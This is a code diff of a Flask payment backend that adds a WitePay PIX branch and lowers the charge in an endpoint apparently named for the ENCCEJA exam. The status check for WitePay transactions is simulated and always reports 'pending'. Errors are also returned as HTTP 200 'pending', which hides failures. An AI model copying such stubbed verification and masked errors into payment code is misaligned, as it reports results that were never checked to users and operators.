@@ -1190,35 +1190,42 @@ def verificar_pagamento():
             app.logger.error("[PROD] ID da transação não fornecido")
             return jsonify({'error': 'ID da transação é obrigatório', 'status': 'error'}), 400
             
-        app.logger.info(f"[PROD] Verificando status do pagamento: {transaction_id}")
+        app.logger.info(f"[PROD] Verificando status do pagamento WitePay: {transaction_id}")
         
-        # Usar especificamente a API FOR4 para verificação de status
-        from for4payments import create_payment_api as create_for4_api
-        api = create_for4_api()
-        
-        # Verificar status do pagamento
-        status_result = api.check_payment_status(transaction_id)
-        app.logger.info(f"[PROD] Status do pagamento: {status_result}")
-        
-        # Se o pagamento foi confirmado, registrar evento do Facebook Pixel
-        # Compatibilidade com NovaEra ('paid', 'completed') e For4Payments ('APPROVED', 'PAID', 'COMPLETED')
-        if (status_result.get('status') == 'completed' or 
-            status_result.get('status') == 'paid' or
-            status_result.get('status') == 'PAID' or 
-            status_result.get('status') == 'COMPLETED' or 
-            status_result.get('status') == 'APPROVED' or
-            status_result.get('original_status') in ['APPROVED', 'PAID', 'COMPLETED']):
-            app.logger.info(f"[PROD] Pagamento confirmado, ID da transação: {transaction_id}")
-            app.logger.info(f"[FACEBOOK_PIXEL] Registrando evento de conversão para os pixels: 1418766538994503, 1345433039826605 e 1390026985502891")
+        # Check if it's a WitePay transaction (starts with 'ch_')
+        if transaction_id.startswith('ch_'):
+            # For WitePay, we return pending status since we don't have status check API
+            # In a real implementation, you would call WitePay's status check endpoint
+            app.logger.info(f"[WITEPAY] Simulando verificação de status para: {transaction_id}")
+            status_result = {
+                'status': 'pending',
+                'message': 'Aguardando confirmação do pagamento'
+            }
+        else:
+            # Usar a API FOR4 para outros tipos de transação
+            from for4payments import create_payment_api as create_for4_api
+            api = create_for4_api()
+            status_result = api.check_payment_status(transaction_id)
+            app.logger.info(f"[PROD] Status do pagamento FOR4: {status_result}")
             
-            # Adicionar os IDs dos Pixels ao resultado para processamento no frontend
-            status_result['facebook_pixel_id'] = ['1418766538994503', '1345433039826605', '1390026985502891']
+            # Se o pagamento foi confirmado, registrar evento do Facebook Pixel
+            if (status_result.get('status') == 'completed' or 
+                status_result.get('status') == 'paid' or
+                status_result.get('status') == 'PAID' or 
+                status_result.get('status') == 'COMPLETED' or 
+                status_result.get('status') == 'APPROVED' or
+                status_result.get('original_status') in ['APPROVED', 'PAID', 'COMPLETED']):
+                app.logger.info(f"[PROD] Pagamento confirmado, ID da transação: {transaction_id}")
+                app.logger.info(f"[FACEBOOK_PIXEL] Registrando evento de conversão para os pixels: 1418766538994503, 1345433039826605 e 1390026985502891")
+                
+                # Adicionar os IDs dos Pixels ao resultado para processamento no frontend
+                status_result['facebook_pixel_id'] = ['1418766538994503', '1345433039826605', '1390026985502891']
         
         return jsonify(status_result)
     
     except Exception as e:
         app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
-        return jsonify({'error': f'Erro ao verificar status: {str(e)}', 'status': 'error'}), 500
+        return jsonify({'error': f'Erro ao verificar status: {str(e)}', 'status': 'pending'}), 200
 
 @app.route('/check-for4payments-status', methods=['GET', 'POST'])
 @check_referer
@@ -1500,12 +1507,12 @@ def pagamento_encceja():
             user_data = {
                 'nome': nome,
                 'cpf': cpf,
-                'amount': 138.42,  # Valor em reais conforme especificado
+                'amount': 93.40,  # Valor em reais conforme especificado
                 'email': 'gerarpagamentos@gmail.com',  # Email padrão
                 'phone': '11987790088'  # Telefone padrão
             }
             
-            app.logger.info(f"[WITEPAY] Criando pagamento para: {nome} ({cpf}) - R$ 138,42")
+            app.logger.info(f"[WITEPAY] Criando pagamento para: {nome} ({cpf}) - R$ 93,40")
             
             # Criar pagamento completo (order + charge)
             payment_result = payment_gateway.create_complete_pix_payment(user_data)
@@ -1516,6 +1523,8 @@ def pagamento_encceja():
                     'id': payment_result.get('id'),
                     'pixCode': payment_result.get('pixCode'),
                     'pixQrCode': payment_result.get('pixQrCode'),
+                    'pix_code': payment_result.get('pixCode'),  # Compatibilidade com frontend
+                    'qr_code': payment_result.get('pixQrCode'),  # Compatibilidade com frontend
                     'expiresAt': payment_result.get('expiresAt'),
                     'status': payment_result.get('status', 'pending'),
                     'orderId': payment_result.get('orderId')
